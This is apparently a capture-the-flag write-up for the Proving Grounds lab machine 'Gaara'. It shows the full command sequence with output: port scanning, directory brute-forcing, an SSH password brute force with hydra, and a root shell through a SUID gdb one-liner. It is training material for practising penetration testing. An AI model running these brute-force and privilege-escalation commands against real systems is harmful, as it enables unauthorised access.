# Gaara

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Easy
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
In this lab, you will exploit a system by brute-forcing credentials for the SSH service and 
escalating privileges by abusing misconfigured SUID permissions on /usr/bin/gdb. The lab 
highlights scenarios involving password brute-forcing and leveraging SUID binaries for 
privilege escalation. This works better with VirtualBox rather than VMware.
Released: 4 May 2021
```

Machine link: [https://portal.offsec.com/machine/gaara-664/overview/details](https://portal.offsec.com/machine/gaara-664/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ export TARGET_IP=192.168.197.142

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 14:40 CET
Nmap scan report for 192.168.197.142
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds
```

We have two services running:

- OpenSSH 7.9p1 on port 22
- Apache httpd 2.4.38 on port 80

### Analyse the web service

Next, we analyse the contents of the web server.

Manually browsing to `http://192.168.197.89/` shows an image of [Gaara](https://en.wikipedia.org/wiki/Gaara)

![Web Site on Gaara](Images/Web_Site_on_Gaara.png)

Doing some basic web enumeration with nmap, we find nothing

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ nmap -v -p80 --script http-enum $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 14:44 CET
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:44
Completed NSE at 14:44, 0.00s elapsed
Initiating Ping Scan at 14:44
Scanning 192.168.197.142 [4 ports]
Completed Ping Scan at 14:44, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:44
Completed Parallel DNS resolution of 1 host. at 14:44, 0.06s elapsed
Initiating SYN Stealth Scan at 14:44
Scanning 192.168.197.142 [1 port]
Discovered open port 80/tcp on 192.168.197.142
Completed SYN Stealth Scan at 14:44, 0.06s elapsed (1 total ports)
NSE: Script scanning 192.168.197.142.
Initiating NSE at 14:44
Completed NSE at 14:44, 3.67s elapsed
Nmap scan report for 192.168.197.142
Host is up (0.034s latency).

PORT   STATE SERVICE
80/tcp open  http

NSE: Script Post-scanning.
Initiating NSE at 14:44
Completed NSE at 14:44, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.05 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

### Do a gobuster scan

Next, we search for additional files and directories with `gobuster`

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.197.142
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 137]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
/Cryoserver           (Status: 200) [Size: 327]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Let's check out the `/Cryoserver` page

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ curl -s http://$TARGET_IP/Cryoserver | grep -v '^$'
/Temari
/Kazekage
/iamGaara
```

The new pages contains A LOT of text.

Going through the text, we find a encoded string in the `/iamGaara` page

```text
Lee is able to pass Gaara's defenses, provoking an enraged Gaara f1MgN9mTf9SNbzRygcU into breaking Lee's arm and leg, claiming victory.[20] 
```

Let's see if we can decode it

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ echo 'f1MgN9mTf9SNbzRygcU' | base64 -d
S 7ԍo4r��                                                                                                                                                                                                             
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ echo 'f1MgN9mTf9SNbzRygcU' | base58 -d
gaara:ismyname  
```

We have likely credentials (`gaara:ismyname`)

### Connect with SSH as Gaara

Next, we try to connect with SSH

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ ssh gaara@$TARGET_IP            
The authenticity of host '192.168.197.142 (192.168.197.142)' can't be established.
ED25519 key fingerprint is SHA256:XpX1VX2RtX8OaktJHdq89ZkpLlYvr88cebZ0tPZMI0I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.197.142' (ED25519) to the list of known hosts.
gaara@192.168.197.142's password: 
Permission denied, please try again.
```

But no, wrong password!?

Maybe we can brute-force the password?

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 32 -f ssh://$TARGET_IP
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-21 15:18:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
[DATA] attacking ssh://192.168.197.142:22/
[22][ssh] host: 192.168.197.142   login: gaara   password: iloveyou2
[STATUS] attack finished for 192.168.197.142 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-21 15:19:20
```

That's better. Let's try this new password instead.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Gaara]
└─$ ssh gaara@$TARGET_IP                                                        
gaara@192.168.197.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ 
```

### Get the user flag

Now we can start looking for the user flag

```bash
gaara@Gaara:~$ ls -la
total 32
drwxr-xr-x 2 gaara gaara 4096 Apr 27  2021 .
drwxr-xr-x 3 root  root  4096 Dec 13  2020 ..
lrwxrwxrwx 1 root  root     9 Mar 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 gaara gaara  220 Dec 13  2020 .bash_logout
-rw-r--r-- 1 gaara gaara 3526 Dec 13  2020 .bashrc
-rw-r--r-- 1 gaara gaara   32 Apr 27  2021 flag.txt
-rw-r--r-- 1 gaara gaara   33 Feb 21 08:40 local.txt
-rw-r--r-- 1 gaara gaara  807 Dec 13  2020 .profile
-rw------- 1 gaara gaara  102 Dec 13  2020 .Xauthority
gaara@Gaara:~$ cat local.txt 
f<REDACTED>7
gaara@Gaara:~$ 
```

Nice, so far so good.

### Enumeration for privesc

We now enumerate the system for privilege escalation opportunities.

We start with checking for sudo commands

```bash
gaara@Gaara:~$ sudo -l
sudo: unable to resolve host Gaara: Name or service not known
[sudo] password for gaara: 
Sorry, user gaara may not run sudo on Gaara.
gaara@Gaara:~$ 
```

Next, we check for SUID and GUID binaries

```bash
gaara@Gaara:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null
      857     40 -rwxr-sr-x   1 root     shadow      39616 Feb 14  2019 /usr/sbin/unix_chkpwd
    12750     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   135600     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
    16097    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
     5509     44 -rwxr-sr-x   1 root     crontab       43568 Oct 11  2019 /usr/bin/crontab
    22040   7824 -rwsr-sr-x   1 root     root        8008480 Oct 14  2019 /usr/bin/gdb
    19754    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
    21629   7396 -rwsr-sr-x   1 root     root        7570720 Dec 24  2018 /usr/bin/gimp-2.10
    22047     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount
       53     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
       52     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
    16090    316 -rwxr-sr-x   1 root     ssh          321672 Jan 31  2020 /usr/bin/ssh-agent
       55     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
       51     72 -rwxr-sr-x   1 root     shadow        71816 Jul 27  2018 /usr/bin/chage
    12942     20 -rwxr-sr-x   1 root     mail          18944 Dec  3  2017 /usr/bin/dotlockfile
     3436     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3583     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       56     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
       54     32 -rwxr-sr-x   1 root     shadow        31000 Jul 27  2018 /usr/bin/expiry
     5436     16 -rwxr-sr-x   1 root     tty           14736 May  4  2018 /usr/bin/bsd-write
     1481     36 -rwxr-sr-x   1 root     tty           34896 Jan 10  2019 /usr/bin/wall
     3908     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
     3910     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
gaara@Gaara:~$ 
```

The [gdb](https://gtfobins.org/gtfobins/gdb/#shell) debugger stands out.

### Get a root shell

Now we can get a root shell

```bash
gaara@Gaara:~$ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# id
uid=0(root) gid=1001(gaara) groups=1001(gaara)
# 
```

### Get the root flag

Finally, we can get the root flag

```bash
# cd /root
# ls -l
total 8
-rw------- 1 root root 33 Feb 21 08:40 proof.txt
-rw-r--r-- 1 root root 32 Apr 27  2021 root.txt
# cat proof.txt
5<REDACTED>1
# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [gdb - GTFOBins](https://gtfobins.org/gtfobins/gdb/#shell)
- [GDB (The GNU Project Debugger) - Documentation](https://sourceware.org/gdb/documentation/)
- [GDB (The GNU Project Debugger) - Homepage](https://sourceware.org/gdb/)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [Hydra - GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra - Kali Tools](https://www.kali.org/tools/hydra/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
